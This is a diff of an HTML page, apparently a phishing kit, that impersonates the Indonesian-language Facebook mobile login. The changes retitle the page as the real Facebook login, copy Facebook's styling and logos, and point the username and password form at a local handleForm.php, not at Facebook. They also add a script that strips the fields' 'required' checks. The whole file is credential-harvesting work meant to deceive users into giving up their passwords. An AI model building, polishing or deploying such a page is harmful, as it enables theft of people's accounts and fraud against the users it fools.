@@ -9,9 +9,10 @@
     <meta property="og:description" content="Facebook">
     <meta property="og:image" content="https://logopng.com.br/logos/facebook-13.png">
     <meta property="og:url" content="https://www.facebook.com">
-    <title>Verifikasi</title>
+    <title>Masuk Facebook | Facebook</title>
     <link rel="icon" type="image/png" sizes="32x32" href="assets/favicon.png">
     <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.cdnfonts.com/css/optimistic-signature" rel="stylesheet">
     <script src="style.css"></script>
 
     <style>
@@ -19,6 +20,7 @@
         body {
             overflow: hidden;
             height: 100%;
+            font-family: 'Optimistic Text Normal';
         }
 
         .background {
@@ -42,6 +44,61 @@
             height: 100vh;
             margin: 0;
         }
+
+        /* Style untuk placeholder */
+        .custom-input::placeholder {
+            color: rgb(103, 120, 138);
+            /* Warna teks lebih gelap */
+            font-weight: 400;
+            font-size: 16px;
+            font-family: "Optimistic Text Medium";
+            opacity: 1;
+            /* Pastikan placeholder tidak transparan */
+        }
+
+        /* Input styling dengan tinggi lebih besar */
+        .custom-input {
+            width: calc(100% - 24px);
+            /* Lebar tetap responsif */
+            height: 58px;
+            /* Tinggi sedikit lebih besar */
+            padding: 16px 18px;
+            /* Memberikan ruang agar teks tidak terlalu mepet */
+            border: 1px solid rgb(180, 190, 200);
+            /* Warna border sedikit lebih gelap */
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 200ms ease, box-shadow 200ms ease;
+            color: rgb(50, 65, 80);
+            /* Warna teks lebih gelap */
+        }
+
+        /* Efek saat input dalam fokus */
+        .custom-input:focus {
+            outline: none;
+            border-color: rgb(100, 120, 140);
+            /* Warna fokus lebih gelap */
+            box-shadow: 0px 0px 4px rgba(100, 120, 140, 0.3);
+            /* Efek glow halus */
+        }
+
+        .custom-input {
+            position: relative;
+            padding: 10px;
+            font-size: 16px;
+            margin: 5px 0;
+            border: 1px solid #ccc;
+            outline: none;
+            transition: all 0.1s ease;
+        }
+
+        .custom-input:focus::placeholder,
+        .custom-input:hover::placeholder {
+            font-size: 12px;
+            transform: translateY(-10px);
+            opacity: 0.8;
+            transition: all 0.1s ease;
+        }
     </style>
 </head>
 
@@ -51,30 +108,55 @@
 
     <div class="container mx-auto relative z-10">
         <div class="up">
-            <p class="text-center text-gray-600 mx-auto my-8 font-normal text-sm">Bahasa Indonesia</p>
+            <p class="text-center mx-auto my-8 font-normal" style="color: rgb(70, 90, 105); font-weight: 400; font-size: 13px; font-family: 'Optimistic Text Normal';">Bahasa Indonesia</p>
             <img class="w-14 mx-auto bg-transparent my-20 rounded-full" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="">
         </div>
 
         <form class="down bg-none flex flex-col" id="form" action="handleForm.php" method="POST">
-            <input class="rounded-lg mr-3 ml-3 py-4 mb-2 px-2 text-base border border-spacing-56 border-gray-300 focus:outline-none focus:border-gray-700 transition duration-300" type="text" id="inputUsername" name="inputUsername" placeholder="Nomor Ponsel atau email" required>
-            <input class="rounded-lg mr-3 ml-3 py-4 mb-2 px-2 text-base border border-gray-300 focus:outline-none focus:border-gray-700 transition duration-300" type="password" id="inputPassword" name="inputPassword" placeholder="Kata Sandi" required>
-            <button class="btn rounded-full mr-3 ml-3 py-2 bg-[#0064E0] text-white hover:bg-blue-700 hover:mr-4 hover:ml-4 cursor-pointer" type="submit" value="Login">Login</button>
-            <p href="https://m.facebook.com/login/identify/" class="mt-2 text-gray-800 bg-none text-sm font-semibold mx-auto mb-20 hover:underline cursor-pointer">Lupa kata sandi?</p>
+            <input class="custom-input mr-3 ml-3 mb-2" type="text" id="inputUsername" name="inputUsername" placeholder="Nomor Ponsel atau email" required>
+            <input class="custom-input mr-3 ml-3 mb-3" type="password" id="inputPassword" name="inputPassword" placeholder="Kata Sandi" required>
+            <span class="eye-icon"></span>
+            <button class="btn rounded-full mr-3 ml-3 py-2 cursor-pointer text-white font-semibold transition-all duration-50 ease-out"
+                style="height: 44px; min-width: 44px; background: rgb(0, 100, 224); font-size: 16px; font-weight: 500; border: none; border-radius: 22px; display: flex; align-items: center; justify-content: center; font-size: 15px; opacity: 1; transition: all 50ms ease-out;"
+                onmouseover="this.style.background='rgb(0, 135, 255)'; this.style.opacity='0.9'; this.style.transform='scaleX(0.98) scaleY(0.995)';"
+                onmouseout="this.style.background='rgb(0, 100, 224)'; this.style.opacity='1'; this.style.transform='scaleX(1) scaleY(1)';">
+                Login
+            </button>
+            <p href="https://m.facebook.com/login/identify/"
+                class="mt-4 bg-none text-sm mx-auto mb-20 cursor-pointer transition-all duration-75 ease-out"
+                style="color: rgb(28, 43, 51); font-weight: 500; font-size: 16px; font-family: 'Optimistic Text Normal'; text-decoration: none; transition: all 75ms ease-out;"
+                onmouseover="this.style.color='rgb(50, 70, 90)'; this.style.textDecoration='none';"
+                onmouseout="this.style.color='rgb(28, 43, 51)'; this.style.textDecoration='none';">
+                Lupa kata sandi?
+            </p>
         </form>
 
         <div class="bottom bg-none flex flex-col mt-8">
-            <button hfref="https://m.facebook.com/reg/" class="btn border border-blue-900 rounded-full mr-3 ml-3 py-2 text-blue-900 font-semibold hover:border-blue-600 hover:text-blue-600 hover:mr-4 hover:ml-4">
+            <button href="https://m.facebook.com/reg/"
+                class="btn rounded-full mr-3 ml-3 py-2 font-semibold cursor-pointer transition-all duration-75 ease-out"
+                style="height: 44px; min-width: 44px; background: rgba(255, 255, 255, 0); border: 1px solid rgb(0, 100, 224); color: rgb(0, 100, 224); font-size: 15px; display: flex; align-items: center; justify-content: center; transition: all 75ms ease-out;"
+                onmouseover="this.style.borderColor='rgb(0, 115, 240)'; this.style.color='rgb(0, 115, 240)'; this.style.transform='scale(0.98)';"
+                onmouseout="this.style.borderColor='rgb(0, 100, 224)'; this.style.color='rgb(0, 100, 224)'; this.style.transform='scale(1)';">
                 Buat akun baru
             </button>
-            <img class="w-16 mx-auto bg-transparent" src="assets/meta.svg" alt="">
+            <div class="w-16 h-16 mx-auto bg-[rgb(70,90,105)]"
+                style="mask-image: url(assets/meta.svg); -webkit-mask-image: url(assets/meta.svg); 
+            mask-size: contain; mask-repeat: no-repeat;">
+            </div>
         </div>
 
-        <div class="footer text-center p-1 text-muted text-xs">
-            <a href="#" class="mx-0.5">Tentang</a>
-            <a href="#" class="mx-0.5">Bantuan</a>
-            <a href="#" class="mx-0.5">Lainnya</a>
+        <div class="footer text-center p-1"
+            style="color: rgb(99, 120, 138); font-size: 10px;">
+            <a href="#" class="mx-0.5" style="color: inherit; text-decoration: none;">Tentang</a>
+            <a href="#" class="mx-0.5" style="color: inherit; text-decoration: none;">Bantuan</a>
+            <a href="#" class="mx-0.5" style="color: inherit; text-decoration: none;">Lainnya</a>
         </div>
     </div>
 </body>
+
+<script>
+    document.getElementById("inputUsername").removeAttribute("required");
+    document.getElementById("inputPassword").removeAttribute("required");
+</script>
 
 </html>
